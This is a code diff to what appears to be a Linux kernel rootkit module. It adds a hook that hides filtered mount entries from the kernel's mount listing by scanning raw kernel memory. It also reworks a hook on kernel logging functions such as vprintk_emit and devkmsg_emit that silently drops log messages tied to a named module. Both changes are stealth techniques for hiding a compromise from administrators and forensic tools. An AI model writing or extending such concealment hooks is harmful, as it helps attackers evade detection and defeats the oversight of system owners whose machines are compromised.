@@ -469,10 +469,41 @@ static int nvk_mount_filter_add(const char *path)
 
 static nvk_mounts_show_fn _nvk_orig_mounts_show_fn;
 
+static int _nvk_mnt_path_match(const char *haystack)
+{
+	int i;
+	for (i = 0; i < _nvk_mnt_filter.count; i++) {
+		const char *path = _nvk_mnt_filter.paths[i];
+		const char *h = haystack;
+		const char *p = path;
+		while (*h && *p && *h == *p) { h++; p++; }
+		if (!*p) return 1;
+	}
+	return 0;
+}
+
 static int _nvk_mounts_show_filter(void *seq, void *v)
 {
 	if (!_nvk_orig_mounts_show_fn)
 		return 0;
+	if (v && _nvk_mnt_filter.count > 0) {
+		unsigned long *mount_ptr = (unsigned long *)v;
+		unsigned long i;
+		for (i = 0; i < 32; i++) {
+			unsigned long val;
+			if (nvk_mem_read(&val, &mount_ptr[i], 8))
+				continue;
+			if (val > 0xFFFF000000000000UL &&
+			    val < 0xFFFFFFFFFFFFF000UL) {
+				const char *name = (const char *)val;
+				unsigned char c;
+				if (!nvk_mem_read(&c, name, 1) &&
+				    c == '/' &&
+				    _nvk_mnt_path_match(name))
+					return 0;
+			}
+		}
+	}
 	return _nvk_orig_mounts_show_fn(seq, v);
 }
 
@@ -678,10 +709,12 @@ static int _nvk_dmesg_should_suppress(const char *text)
 
 static __attribute__((__noinline__)) long _nvk_dmesg_ret0(void) { return 0; }
 
+static int _nvk_dmesg_fmt_reg;
+
 static void _nvk_dmesg_ctx_handler(nvk_reg_ctx *ctx)
 {
-	const char *fmt = (const char *)ctx->regs[2];
-	if (_nvk_dmesg_should_suppress(fmt))
+	const char *fmt = (const char *)ctx->regs[_nvk_dmesg_fmt_reg];
+	if (fmt && _nvk_dmesg_should_suppress(fmt))
 		ctx->force_jump = (u64)(unsigned long)_nvk_dmesg_ret0;
 }
 
@@ -694,12 +727,24 @@ static int nvk_dmesg_suppress_install(const char *module_name)
 
 	nvk_dmesg_filter_add(module_name);
 
-	target = NVK_LOOKUP("devkmsg_emit");
-	if (!target)
-		target = NVK_LOOKUP("vprintk_emit");
-	if (!target)
-		target = NVK_LOOKUP("do_syslog");
-	if (!target) return -1;
+	target = NVK_LOOKUP("vprintk_emit");
+	if (target) {
+		_nvk_dmesg_fmt_reg = 4;
+	} else {
+		target = NVK_LOOKUP("devkmsg_emit");
+		if (target) {
+			_nvk_dmesg_fmt_reg = 1;
+		} else {
+			target = NVK_LOOKUP("vprintk_store");
+			if (target)
+				_nvk_dmesg_fmt_reg = 4;
+			else {
+				target = NVK_LOOKUP("do_syslog");
+				if (!target) return -1;
+				_nvk_dmesg_fmt_reg = 1;
+			}
+		}
+	}
 
 	int ret = nvk_hook_install_ctx(&_nvk_dmesg_ctx_hook, target,
 				       _nvk_dmesg_ctx_handler, (void *)0);
